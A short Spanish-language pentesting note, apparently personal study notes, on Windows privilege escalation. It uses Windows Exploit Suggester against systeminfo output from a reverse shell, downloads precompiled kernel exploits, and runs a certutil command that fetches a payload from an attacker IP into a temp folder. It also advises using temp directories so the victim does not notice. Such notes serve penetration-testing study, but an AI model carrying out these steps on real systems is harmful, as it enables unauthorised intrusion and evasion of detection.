Usando herramientas como windows exploit suggester:
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.- Nos clonamos la herramienta
2.- Obtenemos información del sistema víctima, para ello, en la reverse_shell que tengamos activa usamos el comando de cmd: `systeminfo`. Nos dará una gran cantidad de información del sistema, la copiamos y la guardamos en un fichero .txt.
![[Pasted image 20250206013207.png]]

3.- Vamos al repositorio clonado de la herramienta.
4.- Actualizamos Windows exploit suggester:
````
./windows-exploit-suggester.py --update
````
Nos creará una base de datos en formato fichero de excell.

5.- Ejecutamos windows-exploit-suggester indicándole el nombre del fichero de excell que nos creó y el fichero de texto donde tenemos la información del sistema.
````
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
````

Nos mostrará una serie de exploits recomendados, los que muestra antes son los más importantes.
Los cataloga con E si es de exploitdb, M si es un exploit módulo de metasploit y * que no sé que es.
Para identificar a un exploit se puede usar el CVE o tambíen el MS (microsoft exploit identifier).

### Usar el exploit recomendado
Para probar uno de los exploits recomendados por la herramienta de windows-exploit-suggester, podemos utilizar este link https://github.com/SecWiki/windows-kernel-exploits. En este repositorio, buscamos por el CVE o el MS code y nos descargamos el archivo ya compilado .exe.

Pasos:
1.- Nos descargamos el exploit.
2.- En la session que tenemos activa, nos vamos a la carpeta C:\\Temp. Es un sitio donde tenemos permisos de escritura seguro. No transferir nunca ficheros de nuestra máquina al home o escritorio de la máquina víctima, ya que pueden darse cuenta antes, mejor usar los directorios temporales.
3-  Si estamos en una sesion de meterpreter, usar el comando `upload <ruta del kernel exploit.exe>`
Si no, usar el comando 
`certutil -urlcache -f http://192.168.1.5/shell.exe C:\Windows\Temp\shell.exe
certutil está nativo en windows.

`
4.- Ejecutamos el exploit .\exploit.exe

NOTA: Durante la transferencia de archivos, es posible que el antivirus detecte esta transferencia.
NOTA2: No es recomendable usar kernel exploits ya que pueden hacer que el sistema crashee.
